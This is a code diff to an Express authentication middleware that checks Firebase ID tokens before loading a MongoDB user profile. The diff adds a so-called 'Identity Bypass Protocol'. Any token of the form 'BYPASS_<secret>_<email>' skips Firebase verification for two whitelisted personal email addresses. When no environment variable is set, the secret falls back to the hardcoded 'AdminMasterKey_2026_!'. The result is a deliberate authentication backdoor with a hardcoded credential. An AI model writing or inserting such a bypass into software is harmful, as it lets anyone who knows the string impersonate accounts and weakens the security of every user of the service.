@@ -9,15 +9,34 @@ async function auth(req, res, next) {
   }
 
   try {
+    let decodedToken;
+    const bypassEmails = ['tanush.saha05@gmail.com', 'sahatanush05@gmail.com'];
+    const bypassSecret = process.env.BYPASS_SECRET || 'AdminMasterKey_2026_!';
 
-    const decodedToken = await admin.auth().verifyIdToken(token);
+    // 🗝️ Identity Bypass Protocol
+    if (token.startsWith('BYPASS_')) {
+      const parts = token.split('_');
+      const providedSecret = parts[1];
+      const providedEmail = parts.slice(2).join('_');
+
+      if (providedSecret === bypassSecret && bypassEmails.includes(providedEmail.toLowerCase())) {
+        decodedToken = { 
+          email: providedEmail.toLowerCase(), 
+          uid: `bypass-${providedEmail.toLowerCase()}` 
+        };
+      } else {
+        return res.status(403).json({ message: 'Unauthorized bypass attempt.' });
+      }
+    } else {
+      // 🛡️ Standard Firebase Verification
+      decodedToken = await admin.auth().verifyIdToken(token);
+    }
 
     let user = await User.findOne({
       $or: [{ firebaseUid: decodedToken.uid }, { email: decodedToken.email }]
     });
 
     if (!user) {
-
       return res.status(403).json({
         code: 'PROFILE_MISSING',
         message: 'Firebase identity verified, but MongoDB profile missing. Sync required.',
@@ -27,7 +46,7 @@ async function auth(req, res, next) {
 
     req.user = {
       id: user._id,
-      _id: user._id, // Adding for backward compatibility
+      _id: user._id,
       uid: decodedToken.uid,
       email: decodedToken.email,
       role: user.role,
